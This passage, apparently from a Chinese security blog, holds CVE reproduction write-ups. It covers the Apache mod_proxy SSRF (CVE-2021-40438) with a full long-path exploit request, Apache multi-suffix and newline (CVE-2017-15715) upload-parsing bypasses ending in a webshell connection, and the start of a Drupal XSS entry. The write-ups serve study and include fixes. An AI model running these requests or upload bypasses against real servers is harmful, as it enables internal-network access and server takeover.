ap_proxy_port_of_scheme(scheme);    // second part    ap_proxy_canon_netloc(r-&gt;pool, &amp;url, NULL, NULL, &amp;host, &amp;port);    switch (r-&gt;proxyreq) &#123;    default: /* wtf are we doing here? */    case PROXYREQ_REVERSE:        if (apr_table_get(r-&gt;notes, &quot;proxy-nocanon&quot;)) &#123;            path = url;   /* this is the raw path */        &#125;        else &#123;            path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url),                                     enc_path, 0, r-&gt;proxyreq);            search = r-&gt;args;        &#125;        break;    case PROXYREQ_PROXY:        path = url;        break;    &#125;    if (path == NULL)        return HTTP_BAD_REQUEST;    if (port != def_port)        apr_snprintf(sport, sizeof(sport), &quot;:%d&quot;, port);    else        sport[0] = &#x27;\\0&#x27;;    if (ap_strchr_c(host, &#x27;:&#x27;)) &#123; /* if literal IPv6 address */        host = apr_pstrcat(r-&gt;pool, &quot;[&quot;, host, &quot;]&quot;, NULL);    &#125;    // fourth part    r-&gt;filename = apr_pstrcat(r-&gt;pool, &quot;proxy:&quot;, scheme, &quot;://&quot;, host, sport,            &quot;/&quot;, path, (search) ? &quot;?&quot; : &quot;&quot;, (search) ? search : &quot;&quot;, NULL);    return OK;&#125;\n这个函数中有三个主要的部分，第一部分检查了配置中的url的开头是不是http:或https:，如果不是，说明这个请求不该由mod_proxy_http模块处理，后续的过程跳过；第二部分，用各种方式获取到scheme、host、port、path、search等几个URL的组成变量；第三部分，拼接proxy:、scheme、://、host、sport、/、path、search，成为一个字符串，赋值给r-&gt;filename。\n这里面，scheme、host、port来自于配置文件中配置的ProxyPass，而path、search来自于用户发送的数据包。也就是说，r-&gt;filename中的后半部分是用户可控的。\n那我们回看前面的fix_uds_filename函数，它在r-&gt;filename中查找关键字unix:，并将这个关键字后面直到|的部分作为unix套接字地址，而将|后面的部分作为反代的后端地址。\n我们可以通过请求的path或者search来控制这两个部分，控制了反代的后端地址，这也就是为什么这里会出现SSRF的原因。\n0x04 限制绕过\n当然，这里面有一个问题，那就是Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。\n可以来做个测试，我们发送这样一个请求：\nGET /?unix:/var/run/test.sock|http://example.com/ HTTP/1.1...\n此时会得到一个503错误，错误日志会反馈这样的结果：\n[Mon Oct 18 00:14:38.634795 2021] [proxy:error] [pid 782180:tid 140737306797824] (2)No such file or directory: AH02454: HTTP: attempt to connect to Unix domain socket /var/run/test.sock (192.168.1.1) failed[Mon Oct 18 00:14:38.634875 2021] [proxy_http:error] [pid 782180:tid 140737306797824] [client 192.168.1.142:59696] AH01114: HTTP: failed to make connection to backend: httpd-UDS\n找不到unix套接字/var/run/test.sock，这是当然。\n我们不能让他把请求发送到unix套接字上，而是发送给我们需要的|后面的地址。\n国外那位作者给出了一个非常巧妙的方法，在fix_uds_filename函数中，unix套接字的地址来自于下面这两行代码：\nchar *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);apr_table_setn(r-&gt;notes, &quot;uds_path&quot;, sockpath);\n如果这里ap_runtime_dir_relative函数返回值是null，则后面获取uds_path时将不会使用unix套接字地址，而变成普通的TCP连接：\nuds_path = (*worker-&gt;s-&gt;uds_path ? worker-&gt;s-&gt;uds_path : apr_table_get(r-&gt;notes, &quot;uds_path&quot;));if (uds_path) &#123;    if (conn-&gt;uds_path == NULL) &#123;        /* use (*conn)-&gt;pool instead of worker-&gt;cp-&gt;pool to match lifetime */        conn-&gt;uds_path = apr_pstrdup(conn-&gt;pool, uds_path);    &#125;    // ...    conn-&gt;hostname = &quot;httpd-UDS&quot;;    conn-&gt;port = 0;&#125;else &#123;    // ...    conn-&gt;hostname = apr_pstrdup(conn-&gt;pool, uri-&gt;hostname);    conn-&gt;port = uri-&gt;port;    // ...&#125;\n那么如何让ap_runtime_dir_relative的返回值是null？ap_runtime_dir_relative函数最后引用了apr库中的apr_filepath_merge函数，它的主要作用就是路径的join，用于处理相对路径、绝对路径、../连接。\n这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null：\nrootlen = strlen(rootpath);maxlen = rootlen + strlen(addpath) + 4; /* 4 for slashes at start, after                                             * root, and at end, plus trailing                                             * null */if (maxlen &gt; APR_PATH_MAX) &#123;    return APR_ENAMETOOLONG;&#125;\n也就是说，我们只需要在unix:与|之间传入内容长度大概超过4092的字符串，就能构造出uds_path为null的结果，让Apache不再发送请求给unix套接字。\n最后，这样构造出的请求成功触发SSRF漏洞：\nEXP\nGET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1Host: 192.168.1.162:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close\n![image-20230916160123781](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160123781.png)\n![image-20230916161434812](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916161434812.png)\n上面这个是vps新建的1.txt\nApache官方对这个漏洞的修复也比较简单，因为用户只能控制r-&gt;filename的后半部分，而前半部分proxy:&#123;scheme&#125;://&#123;host&#125;&#123;sport&#125;/来自于配置文件，所以最新版改成检查其开头是不是proxy:unix:，这一部分用户无法控制。\n0x05 mod_proxy_fcgi是否存在漏洞？\n我们前文都以mod_proxy_http作为例子来研究，而在Apache+PHP环境下，mod_proxy_fcgi的使用频率更高，那么它是否也会被SSRF漏洞影响呢？\n这个漏洞出现在modules/proxy/proxy_util.c的fix_uds_filename函数，理论上是mod_proxy的漏洞，那么它的子模块应该都会被影响，但这个漏洞中有一个很关键的变量是r-&gt;filename，他是否可控决定了后面的利用是否可以成功。\n我们看一下mod_proxy_fcgi的canon函数：\nstatic int proxy_fcgi_canon(request_rec *r, char *url)&#123;    char *host, sport[7];    const char *err;    char *path;    apr_port_t port, def_port;    fcgi_req_config_t *rconf = NULL;    const char *pathinfo_type = NULL;    if (ap_cstr_casecmpn(url, &quot;fcgi:&quot;, 5) == 0) &#123;        url += 5;    &#125;    else &#123;        return DECLINED;    &#125;    // ...    if (apr_table_get(r-&gt;notes, &quot;proxy-nocanon&quot;)) &#123;        path = url;   /* this is the raw path */    &#125;    else &#123;        path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url), enc_path, 0,                             r-&gt;proxyreq);    &#125;    if (path == NULL)        return HTTP_BAD_REQUEST;    r-&gt;filename = apr_pstrcat(r-&gt;pool, &quot;proxy:fcgi://&quot;, host, sport, &quot;/&quot;,                              path, NULL);    // ...&#125;\n可见，这里的r-&gt;filename等于proxy:fcgi://&#123;host&#125;&#123;sport&#125;/&#123;path&#125;，相比于mod_proxy_http少了search。不过，path仍然是用户可以控制的，我们可以尝试发送这样的数据包：\nGET /unix:testtest|http://example.com/1.php HTTP/1.1...\n经过调试可见，path中的|被ap_proxy_canonenc函数编码成了%7C：\n![image-20230916160430616](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160430616.png)\n没有|，后面也就无法完成SSRF利用了。\n0x06 哪些模块受到影响\n那么，我们其实可以认为，如果r-&gt;filename有部分可控，且可控的部分没有被编码（不是path），这个模块就会受到SSRF漏洞的影响。\n对这个结论我没有逐一测试考证，我仅挑选另一个较为常用的模块mod_proxy_ajp来复现漏洞。\nmod_proxy_ajp是用于反代Tomcat的一个Apache模块，Tomcat在8.5.51版本以前默认会开启两个端口8080和8009，分别对应HTTP协议和AJP协议。HTTP协议好理解，AJP协议是一个二进制协议，通信协议相比起来效率更高。所以以前很多运维人员会将Tomcat架设在Apache之后，然后二者之间使用AJP协议通信。\nTomcat 8.5.51之后的版本受到Ghostcat漏洞影响不再默认开放8009端口。\nApache下有两个模块能实现AJP的反代通信：\n\nmod_proxy_ajp 这就是mod_proxy的一个子模块，由Apache HTTPd官方维护\nmod_jk 这是Tomcat官方维护的一个Apache模块，更加出名用户也更多\n\n由于mod_jk不是用mod_proxy的代码，所以不受到影响，我们今天仅测试mod_proxy_ajp。\n简单部署一个开放8009端口的Tomcat服务器，并配置好mod_proxy_ajp进行调试，可见其proxy_ajp_canon函数r-&gt;filename中是包含search的：\nstatic int proxy_ajp_canon(request_rec *r, char *url)&#123;    char *host, *path, sport[7];    char *search = NULL;    const char *err;    apr_port_t port, def_port;    /* ap_port_of_scheme() */    if (strncasecmp(url, &quot;ajp:&quot;, 4) == 0) &#123;        url += 4;    &#125;    else &#123;        return DECLINED;    &#125;    // ...    r-&gt;filename = apr_pstrcat(r-&gt;pool, &quot;proxy:ajp://&quot;, host, sport,                              &quot;/&quot;, path, (search) ? &quot;?&quot; : &quot;&quot;,                              (search) ? search : &quot;&quot;, NULL);    return OK;&#125;\n那么按照我们的预测，这里也会存在SSRF漏洞。果然测试成功：\n![image-20230916160702168](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160702168.png)\n那么，mod_proxy_http2、mod_proxy_balancer、mod_proxy_wstunnel等这些模块也会受到影响，而mod_proxy_uwsgi、mod_proxy_scgi等模块不受影响。我没有严格验证，有兴趣的同学可以自己下去调试一下，也许还能找到绕过方法。\n0x07 几个常见问题和总结\n​\t\t一个大家问的比较多的问题：这个SSRF漏洞是否能够POST？答案是肯定的，理解了原理的同学肯定能明白，我们实际上是控制了反向代理的目标服务器地址。既然是反向代理，那么实际上用户请求的大部分原始数据都会被直接转发给后端，所以，我们只需要发送POST请求，即可让执行POST的SSRF，比如：\n![image-20230916160751658](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160751658.png)\n另一个，这个SSRF漏洞是否可以打本地的unix socket？答案是肯定的。原本这个漏洞的第一请求目标就是本地的unix套接字，我们使用4092个超长search绕过了这个限制让他可以打任意远程地址，只要让它回归原本的方法就可以打本地的unix套接字了：\n![image-20230916160834660](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160834660.png)\n打本地unix套接字的好处是可以攻击类似于Docker、Supervisor这样的本地服务。\n最后一个问题，这个SSRF漏洞是否可以攻击一些非HTTP协议的服务？答案也是肯定的。TCP是一个数据流，即使我们打出的数据包前面有HTTP头，这并不影响后续正常的满足二进制协议的数据流的发送与接收。不过有一个例外情况，如果目标服务有一些特殊的操作，类似于高版本redis读取到一些特殊的HTTP数据段就断开TCP连接这样的操作，那么可能需要进行一些额外绕过了。\n总结一下，这个SSRF漏洞的本质是Apache在解析反代服务URL的时候，由于对unix:位置要求不严格，导致用户的输入可以控制反代的逻辑，最终导致反代URL被控制，造成SSRF漏洞。\nCVE-2021-40438 漏洞为 Apache httpd 的 SSRF 漏洞，核心原理是 mod_proxy 模块为了支持 UDS (Unix Domain Socket) 转发而产生了安全性问题，并由多个位置代码问题组合产生。通过上面的分析可知，漏洞触发的前提如下：\n1.需开启 mod_proxy 配置2.需已知 `VirtualHost` 中 `ProxyPass` 指定的 URL 项3.使用 GET 请求超长字符串且超过目标 Apache 设置4.windows 版本漏洞依然存在\n这里不知为何不能访问百度（新手别喷┭┮﹏┭┮）或许是百度做了防护或者是百度协议为https的缘故，亦或者某种原因吧，可能是我浅薄了。。。\n0x08 参考文章\nCVE-2021-40438 Apache mod_proxy SSRF 漏洞分析\nApache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Apache HTTPD 多后缀解析漏洞","url":"/2023/09/16/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","content":"0x01 漏洞描述\nApache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：\nAddType text/html .htmlAddLanguage zh-CN .cn\n其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。\n以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：\nAddHandler application/x-httpd-php .php\n那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。\n0x02 影响版本\n与Apache版本无关，与服务器配置有关\n\nAddHandler application/x-httpd-php .php\n\n0x03 漏洞分析\nindex.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。\nindex.php源码：\n&lt;?phpif (!empty($_FILES)):$ext = pathinfo($_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);//这种取文件名的方式,杜绝了换行符if (!in_array($ext, [&#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;])) &#123; //白名单    die(&#x27;Unsupported filetype uploaded.&#x27;);&#125;$new_name = __DIR__ . &#x27;/uploadfiles/&#x27; . $_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;];//设置路径if(!move_uploaded_file($_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;], $new_name))&#123;//上传文件    die(&#x27;Error uploading file - check destination is writeable.&#x27;);&#125;die(&#x27;File uploaded successfully: &#x27; . $new_name);else:?&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;    &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php\n以gif、png、jpg、jpeg为后缀的文件均可上传成功，将文件保存到/uploadfiles/目录下，上传完成后并未重命名。\n查看配置文件：\n# cat conf/docker-php.confAddHandler application/x-httpd-php .phpDirectoryIndex disabledDirectoryIndex index.php index.html                       &lt;Directory /var/www/&gt;    Options -Indexes    AllowOverride All\n配置文件中存在AddHandler application/x-httpd-php .php，文件名只要有.php的后缀就会被当成php文件执行。\n0x04 漏洞复现\ndocker启动好之后，访问ip:80\n![image-20230916193303999](Apache HTTPD 多后缀解析漏洞/image-20230916193303999.png)\n直接访问http://your-ip/uploadfiles/apache.php.jpeg即可发现，phpinfo被执行了，该文件被解析为php脚本。\n![image-20230916193325731](Apache HTTPD 多后缀解析漏洞/image-20230916193325731.png)\n我们接下来正常操作一下，正常上传php文件，Unsupported filetype uploaded\n![image-20230916193419902](Apache HTTPD 多后缀解析漏洞/image-20230916193419902.png)\n那在后面加上白名单允许的后缀看看\n![image-20230916193524359](Apache HTTPD 多后缀解析漏洞/image-20230916193524359.png)\n成功上传，访问试试\n![image-20230916193542496](Apache HTTPD 多后缀解析漏洞/image-20230916193542496.png)\n0x05 修复建议\n\n将AddHandler application/x-httpd-php .php的配置文件删除。\n\n0x06 参考文章\n【漏洞复现】Apache HTTPD 多后缀解析漏洞 _\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Apache HTTPD 换行解析漏洞（CVE-2017-15715）","url":"/2023/09/16/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/","content":"0x01 漏洞描述\nApache HTTPD是一款HTTP服务器，它可以通过mod_PHP来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，shell.PHP\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。\n0x02 影响版本\nApache HTTPD 2.4.0~2.4.29\n0x03 漏洞分析\n此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。\nindex.php源码：\n&lt;?phpif(isset($_FILES[&#x27;file&#x27;])) &#123;    $name = basename($_POST[&#x27;name&#x27;]);  //相当于/var/www/html/1.php在basename函数下只返回1.php    $ext = pathinfo($name,PATHINFO_EXTENSION); //取上传文件的后缀名，例如上面的php    if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;, &#x27;phtml&#x27;, &#x27;pht&#x27;])) &#123;        exit(&#x27;bad file&#x27;);//设置黑名单    &#125;    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &#x27;./&#x27; . $name);//将文件保存到某个路径下，并重新命名&#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;p&gt;                &lt;label&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/label&gt;        &lt;/p&gt;        &lt;p&gt;                &lt;label&gt;filename:&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;evil.php&quot;&gt;&lt;/label&gt;        &lt;/p&gt;        &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;?&gt;\n以POST请求方式传入参数name，并通过设置黑名单来过滤后缀。\n配置文件：\n#cat /etc/apache2/conf-available/docker-php.conf&lt;FilesMatch \\.php$&gt;        SetHandler application/x-httpd-php&lt;/FilesMatch&gt;DirectoryIndex disabledDirectoryIndex index.php index.html&lt;Directory /var/www/&gt;        Options -Indexes        AllowOverride All&lt;/Directory&gt;\n​\t\t前三行的内容意思是将所有以“.php”为后缀的文件内容当作PHP代码进行解析，但是却使用了“$”进行文件匹配，这就导致了漏洞的产生。（很明显如果没有后面的$，那我们根本 不可能上传.php文件让其以php代码解析）\n​\t\t但是不巧的是这里还有一个东西就是$这个东西，它是用来匹配字符串结尾位置的，而且如果设置了RegExp 对象(正则表达式)的 Multiline(/m) 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。\n​\t\t所以如果我们设置了RegExp 对象的 Multiline 属性(\\m)的条件下，$还会匹配到字符串结尾的换行符（也就是%0a),于是也就产生了这么一个换行解析漏洞\n0x04 漏洞复现\n访问http://ip:8080，显示如下页面：\n![image-20230916145037717](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145037717.png)\n简单的上传界面，我们先随便上传测试一下\n![image-20230916145100933](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145100933.png)\n可以看到evil.php被拦截了，我们bp抓包在后面添加换行符看看\n​\t\t这里有一点需要注意，我们不能直接在shell.php文件名后面加上%0a，因为Get传参他是有URL的编码解码的，但是我们这里是POST传参，他没有，所以我们通过Hex编码的方式手动给他加上\n我们先加一个a(我们都知道a的16进制编码是61)，然后我们去找到这个61进行替换就好了\n![image-20230916145831851](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145831851.png)\n改为0a\n![image-20230916145931567](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145931567.png)\n![image-20230916145941649](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145941649.png)\n看看是否上传成功，这里不知道为何我访问没反应，于是重新上传了一下，进入Hex在evil.php后直接加了0a，上传后，访问evil.php成功了\n![image-20230916150348626](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916150348626.png)\n改为一句话木马，蚁剑连接也成功\n![image-20230916150502997](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916150502997.png)\n0x05 漏洞修复\n1.升级到最新版本\n2.将上传的文件重命名为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限\n3.禁止上传文件执行\n0x06 总结\n这个漏洞需要有以下利用条件：\n1、获取文件名时不能用**$_FILES[&#x27;file&#x27;][&#x27;name&#x27;],因为它会自动把换行去掉。2、Apache版本为2.4.0到2.4.293、服务器必须是**linux系统**，因为windows环境下不支持后缀名带有换行符\\x0a总体上而言，只要取**$FILES[‘file’][‘name’]作为文件名，就可以无视该解析漏洞，所以该漏洞总体来说实际用处不大，但是由于漏洞根本成因在于$，在以后的其他某些漏洞可能会有利用到的地方，所以这个作为一种姿势学习一下还是很有趣的。\n0x07 参考文章\nApache HTTPD 换行解析漏洞分析与复现（CVE-2017-15715）\n【漏洞复现】Apache HTTPD 换行解析漏洞 (CVE-2017-15715)\nApache HTTPD换行解析漏洞（CVE-2017-15715\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Drupal XSS漏洞（CVE-2019-6341）","url":"/2023/09/16/Drupal%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6341%EF%BC%89/","content":"0x01-漏洞概述\n\n影响软件：Drupal\n方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞\n参考链接：Drupal 1-click to RCE 分析\n效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）\n\n0x02-漏洞环境\n执行如下命令启动drupal 8.5.0的环境：\ndocker-compose up -d\n环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。\n0x03-Drupal资料\nGPT回答:\nDrupal是一种独立开源的内容管理系统（Content Management 